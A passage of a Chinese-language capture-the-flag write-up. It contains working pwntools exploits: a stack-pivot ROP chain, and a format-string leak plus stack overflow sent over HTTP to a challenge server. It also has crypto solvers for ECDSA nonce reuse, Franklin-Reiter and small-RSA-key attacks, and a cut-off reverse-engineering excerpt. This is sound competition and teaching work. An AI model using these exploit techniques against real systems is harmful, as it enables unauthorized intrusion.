args.GDB:<span class="keyword">return</span> gdb.debug(binary,gdbscript)</span><br><span class="line">    <span class="keyword">if</span> args.TAG:<span class="keyword">return</span> remote(*args.TAG.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> args.REM:<span class="keyword">return</span> remote(*attack.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> process([binary] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">context(binary = binary, log_level = <span class="string">&#x27;debug&#x27;</span>,</span><br><span class="line">terminal=<span class="string">&#x27;tmux splitw -h -l 170&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="comment">#libc = context.binary.libc</span></span><br><span class="line"><span class="comment">#elf  = ELF(binary)</span></span><br><span class="line"><span class="comment">#print(context.binary.libs)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#import socks</span></span><br><span class="line"><span class="comment">#context.proxy = (socks.SOCKS5, &#x27;192.168.31.251&#x27;, 10808)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b * 0x0040114E</span></span><br><span class="line"><span class="string">#continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line"><span class="comment">#os.systimport os</span></span><br><span class="line"><span class="comment">#io = remote(*attack.split(&#x27;:&#x27;))</span></span><br><span class="line">io = start([])</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404000</span> + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">ret1 = <span class="number">0x0401133</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span> *<span class="number">0x10</span></span><br><span class="line">pay += p64(<span class="number">0x404000</span> + <span class="number">0xe00</span>)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">add_ebx = <span class="number">0x000000000040110c</span> <span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span></span><br><span class="line">magic2  = <span class="number">0x4010FC</span></span><br><span class="line">start   = <span class="number">0x401049</span></span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x0000000000401126</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">rbp = <span class="number">0x000000000040110d</span> <span class="comment"># pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">    <span class="number">0xbeef</span>,</span><br><span class="line">    bss + <span class="number">0x800</span>,</span><br><span class="line">    rbp,</span><br><span class="line">    <span class="number">0x404ef8</span> - <span class="number">0x48</span>,</span><br><span class="line">    magic2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    start</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="comment">#pay  = p64(0xbeef) + p64(0x0)</span></span><br><span class="line"><span class="comment">#pay += p64(bss)</span></span><br><span class="line"><span class="comment">#pay += p64(ret1)</span></span><br><span class="line"><span class="comment">#s(pay)</span></span><br><span class="line">bss += <span class="number">8</span></span><br><span class="line">offset1 = <span class="number">0xb323e</span></span><br><span class="line"></span><br><span class="line">pay  = p64(<span class="number">0xbeefbeef1</span>) + p64(<span class="number">0xbeefbeef2</span>)</span><br><span class="line">pay += p64(<span class="number">0x000401049</span>)</span><br><span class="line">pay += p64(start)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span> *<span class="number">0x10</span></span><br><span class="line">pay += p64(bss+<span class="number">0x4d8</span>+<span class="number">0xb8</span>)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span> *<span class="number">0x10</span></span><br><span class="line">pay += p64(bss+<span class="number">0x18</span>+<span class="number">0xb8</span>+<span class="number">0x4d8</span>)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pay  = p64(rbp) + p64(bss+<span class="number">0x28</span>+<span class="number">0xb8</span>+<span class="number">0x4d8</span>)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line"><span class="comment">#pay += p64(0x111111111)</span></span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">lss(<span class="string">&#x27;offset1&#x27;</span>)</span><br><span class="line">pay = p64(rbp) + p64(<span class="number">0x404dc8</span>-<span class="number">0x48</span>)</span><br><span class="line">pay += p64(magic2) + p64(offset1-<span class="number">0x21</span>) <span class="comment"># 这里不够回到 _start 函数，要提前在stack 上布置</span></span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">lss(<span class="string">&#x27;offset1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">oo = <span class="number">0</span></span><br><span class="line">pay = <span class="string">b&#x27;A&#x27;</span> *<span class="number">0x10</span></span><br><span class="line">pay += p64(bss+oo)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;B&#x27;</span> *<span class="number">0x10</span></span><br><span class="line">pay += p64(bss+<span class="number">0x18</span>+oo)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x404d68</span></span><br><span class="line"></span><br><span class="line">pay  = p64(rbp) + p64(offset+<span class="number">0x3d</span>)</span><br><span class="line">pay += p64(add_ebx)</span><br><span class="line">pay += p64(<span class="number">0x00401049</span>)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line">oo = <span class="number">0</span></span><br><span class="line">pay = <span class="string">b&#x27;A&#x27;</span> *<span class="number">0x10</span></span><br><span class="line">pay += p64(bss+oo)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;B&#x27;</span> *<span class="number">0x10</span></span><br><span class="line">pay += p64(bss+<span class="number">0x18</span>+oo)</span><br><span class="line">pay += p64(ret1)</span><br><span class="line">s(pay)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript=gdbscript)</span></span><br><span class="line">pay  = p64(rbp) + p64(<span class="number">0x404d60</span>)</span><br><span class="line">pay += p64(<span class="number">0x040114E</span>)</span><br><span class="line">s(pay)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2><span id="nsusserver">NSUSServer</span><a href="#nsusserver" class="header-anchor"></a></h2><p>格式化字符串泄露地址， 然后 直接栈溢出</p>
<p>a.so 可以直接访问远程环境下载</p>
<p><img src="./8312ebfa-6b66-4a8e-a565-57b42f3575ca.png" alt="img"></p>
<p>访问一个不存在的文件时，会调用这个函数 存在格式化字符串漏洞</p>
<p><img src="./90840edc-856b-4c9c-b041-35f1cc01a6c0.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;127.0.0.1 9999&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">attack = <span class="string">&#x27;node5.buuoj.cn:27338&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./attachment&#x27;</span></span><br><span class="line"></span><br><span class="line">context(binary = binary, log_level = <span class="string">&#x27;debug&#x27;</span>,</span><br><span class="line">terminal=<span class="string">&#x27;tmux splitw -h -l 170&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="comment">#libc = context.binary.libc</span></span><br><span class="line"><span class="comment">#elf  = ELF(binary)</span></span><br><span class="line"><span class="comment">#print(context.binary.libs)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#import socks</span></span><br><span class="line"><span class="comment">#context.proxy = (socks.SOCKS5, &#x27;192.168.31.251&#x27;, 10808)</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line"><span class="comment">#os.systimport os</span></span><br><span class="line">io = remote(*attack.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line"><span class="comment">#io = start([])</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">4</span></span><br><span class="line">path = <span class="string">f&#x27;HACK%<span class="subst">&#123;n+<span class="number">0xf1</span>&#125;</span>$p-%<span class="subst">&#123;n+<span class="number">0xf3</span>&#125;</span>$p-%<span class="subst">&#123;n+<span class="number">0xf5</span>&#125;</span>$p-HACK&#x27;</span></span><br><span class="line">headers = (</span><br><span class="line">    <span class="string">f&quot;GET <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">)</span><br><span class="line">s(headers)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;HACK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">elf_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x0379E</span></span><br><span class="line"></span><br><span class="line">lss(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line">lss(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lss(<span class="string">&#x27;elf_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(*attack.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rdi = libc_base + <span class="number">0x000000000002a3e5</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">rsi = libc_base + <span class="number">0x000000000002be51</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">flag =  elf_base + <span class="number">0x043AB</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">pay += p64(canary) * <span class="number">2</span></span><br><span class="line">pay += p64(<span class="number">0xbeefbeef</span>)</span><br><span class="line">pay += p64(<span class="number">0xbeef1</span>)</span><br><span class="line">pay += p64(rdi+<span class="number">1</span>)</span><br><span class="line">pay += p64(rsi)</span><br><span class="line">pay += p64(flag)</span><br><span class="line">pay += p64(rdi)</span><br><span class="line">pay += p64(<span class="number">4</span>)</span><br><span class="line">pay += p64(elf_base + <span class="number">0x2BA3</span>)</span><br><span class="line"></span><br><span class="line">headers = (</span><br><span class="line">    <span class="string">b&quot;GET /a.cgi?input=&quot;</span> + pay + <span class="string">b&quot; HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">)</span><br><span class="line">s(headers)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pay = flat(&#123;</span></span><br><span class="line"><span class="comment">#&#125;,filler=b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,gdbscript)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc.address = libc_base</span></span><br><span class="line"><span class="comment"># system = libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># bin_sh = next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="excessive-security">Excessive Security</span><a href="#excessive-security" class="header-anchor"></a></h2><p>ecdsa复用了随机数k1、k2和私钥x1、x2，四个式子整理一下就是两变量x1、x2和两个方程，可以用矩阵解。剩下打Franklin-Reiter攻击，系数大了点用HGCD即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">115792089237316195423570985008687907852837564279074904382605163141518161494337</span></span><br><span class="line">Zn = Zmod(n)</span><br><span class="line"></span><br><span class="line">s1 = Zn(<span class="number">70264613994433317101824708333691569351293428290775945022557096997867421112623</span>)</span><br><span class="line">s2 = Zn(<span class="number">27386247988345867998752358066350183725137348277248603318763377237810993039608</span>)</span><br><span class="line">h1 = Zn(<span class="number">68926494835039378729440404424793589316085902585443402029912033361291851069895</span>)</span><br><span class="line">h2 = Zn(<span class="number">99816429822339421445908151468618514820067970997726274244928092260385418279182</span>)</span><br><span class="line">r1 = Zn(<span class="number">95467825458659408375936425122753380788640181504557006906236884175684680903422</span>)</span><br><span class="line"></span><br><span class="line">s3 = Zn(<span class="number">108271537842404710192407976239166854351892165018292127464175836717873395489565</span>)</span><br><span class="line">s4 = Zn(<span class="number">100312693542625967610858608130705401648902828203826044299984002070083890684220</span>)</span><br><span class="line">h3 = Zn(<span class="number">100471089356874379799029324099340355602511511524623953182021635156113287196537</span>)</span><br><span class="line">h4 = Zn(<span class="number">53552261622392134420510144174810499568173979993026285111445672642139328877380</span>)</span><br><span class="line">r2 = Zn(<span class="number">13940715298251935708383205669373172931583958487449924842542107474174521484127</span>)</span><br><span class="line"></span><br><span class="line">A = Matrix(Zn, [</span><br><span class="line">    [s2 * r1, -s1 * r1],</span><br><span class="line">    [s4 * r2, -s3 * r2]</span><br><span class="line">])</span><br><span class="line">b = vector(Zn, [</span><br><span class="line">    s1 * h2 - s2 * h1,</span><br><span class="line">    s3 * h4 - s4 * h3</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> A.is_singular():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] no&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sol = A.solve_right(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] find：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;x1 = <span class="subst">&#123;sol[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;x2 = <span class="subst">&#123;sol[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257</span></span><br><span class="line">c1 = <span class="number">40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331</span></span><br><span class="line">c2 = <span class="number">4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385</span></span><br><span class="line"></span><br><span class="line">x1=<span class="number">17754677231116188359396131937000664637388235962309739341039576063530375612219</span></span><br><span class="line">x2=<span class="number">79541650983569507936838949546074094434344869740141472134648391439474061318003</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">2</span> * b.degree() &lt;= a.degree() <span class="keyword">or</span> a.degree() == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    m = a.degree() // <span class="number">2</span></span><br><span class="line">    a_top, a_bot = a.quo_rem(x ^ m)</span><br><span class="line">    b_top, b_bot = b.quo_rem(x ^ m)</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a_top, b_top)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    q, e = c.quo_rem(d)</span><br><span class="line">    d_top, d_bot = d.quo_rem(x ^ (m // <span class="number">2</span>))</span><br><span class="line">    e_top, e_bot = e.quo_rem(x ^ (m // <span class="number">2</span>))</span><br><span class="line">    S00, S01, S10, S11 = HGCD(d_top, e_top)</span><br><span class="line">    RET00 = S01 * R00 + (S00 - q * S01) * R10</span><br><span class="line">    RET01 = S01 * R01 + (S00 - q * S01) * R11</span><br><span class="line">    RET10 = S11 * R00 + (S10 - q * S11) * R10</span><br><span class="line">    RET11 = S11 * R01 + (S10 - q * S11) * R11</span><br><span class="line">    <span class="keyword">return</span> RET00, RET01, RET10, RET11</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    q, r = a.quo_rem(b)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a, b)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> c.monic()</span><br><span class="line">    q, r = c.quo_rem(d)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> GCD(d, r)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f1 = x^e - c1</span><br><span class="line">f2 = (x1*x + x2)^e - c2</span><br><span class="line">res = GCD(f1,f2)</span><br><span class="line">m = -res.monic().coefficients()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<h2><span id="strange-rsa">Strange RSA</span><a href="#strange-rsa" class="header-anchor"></a></h2><p>首先发现u,v较小，导致hint函数里面的d1，d2是小私钥，用boneh脚本可以解出d1，d2进一步解出u，v</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">d1 = <span class="number">1649010712229782299850848551980277578291258538000633837589698050054193337459137087</span></span><br><span class="line">d2 = <span class="number">1285707407708336469611922789424965876916577005852352154890635610024931952186455505</span></span><br><span class="line">long_to_bytes(ZZ(<span class="built_in">pow</span>(hint_ct,d2,N2)))</span><br><span class="line">v2 = d1 // gcd(d1,d2) + d2 // gcd(d1,d2)</span><br><span class="line">v = v2//<span class="number">2</span></span><br><span class="line">u2 = d1 // gcd(d1,d2) - d2 // gcd(d1,d2)</span><br><span class="line">u = u2//<span class="number">2</span></span><br><span class="line">v,u</span><br><span class="line">(<span class="number">21576</span>, <span class="number">2671</span>)</span><br></pre></td></tr></table></figure>

<p>观察e的生成，有等式</p>
<p>$$\frac{eu}{v} &#x3D; \frac{w}{v} + A$$</p>
<p>$$e \cdot u &#x3D; w + A \cdot v$$</p>
<p>其中e,u,v已知，A为2048bits，w为538bits</p>
<p>进一步变形</p>
<p>$$\text A &#x3D; N^4 - s^4 + 4Ns^2 - 2N^2 + 1, ; s &#x3D; p + q$$</p>
<p>考虑近似求出s，然后factor N，实际发现求出的s+1等于p+q</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">r = u*e3 // v</span><br><span class="line">s = var(<span class="string">&quot;s&quot;</span>)</span><br><span class="line">f = N1^<span class="number">4</span> - s^<span class="number">4</span> + <span class="number">4</span>*N1*s^<span class="number">2</span> - <span class="number">2</span>*N1^<span class="number">2</span> + <span class="number">1</span> - r</span><br><span class="line">p_q = <span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>]) + <span class="number">1</span></span><br><span class="line">x = var(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">f = x*(p_q - x) - N1</span><br><span class="line">q = <span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q = N1//p</span><br><span class="line"><span class="keyword">assert</span> p*q == N1</span><br><span class="line">d = inverse_mod(e3,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">long_to_bytes(ZZ(<span class="built_in">pow</span>(flag_ct,d,N1)))</span><br></pre></td></tr></table></figure>

<h1><span id="reverse">Reverse</span><a href="#reverse" class="header-anchor"></a></h1><h2><span id="xuans">xuans</span><a href="#xuans" class="header-anchor"></a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_403A52</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int8 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = ((<span class="type">unsigned</span> __int64)a2[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> __int64)a2[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | ((<span class="type">unsigned</span> __int64)*a2 &lt;&lt; <span class="number">24</span>) | a2[<span class="number">3</span>];</span><br><span class="line">  v6 = ((<span class="type">unsigned</span> __int64)a2[<span class="number">6</span>] &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> __int64)a2[<span class="number">5</span>] &lt;&lt; <span class="number">16</span>) | ((<span class="type">unsigned</span> __int64)a2[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | a2[<span class="number">7</span>];</span><br><span class="line">  v7 = ((<span class="type">unsigned</span> __int64)a2[<span class="number">10</span>] &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> __int64)a2[<span class="number">9</span>] &lt;&lt; <span class="number">16</span>) | ((<span class="type">unsigned</span> __int64)a2[<span class="number">8</span>] &lt;&lt; <span class="number">24</span>) | a2[<span class="number">11</span>];</span><br><span class="line">  v8 = ((<span class="type">unsigned</span> __int64)a2[<span class="number">14</span>] &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> __int64)a2[<span class="number">13</span>] &lt;&lt; <span class="number">16</span>) | ((<span class="type">unsigned</span> __int64)a2[<span class="number">12</span>] &lt;&lt; <span class="number">24</span>) | a2[<span class="number">15</span>];</span><br><span class="line">  v4[<span class="number">0</span>] = v5 ^ <span class="number">0xA3B1BAC6</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = v6 ^ <span class="number">0x56AA3350</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = v7 ^ <span class="number">0x677D9197</span>;</span><br><span class="line">  result = v8 ^ <span class="number">0xB27022DC</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = v8 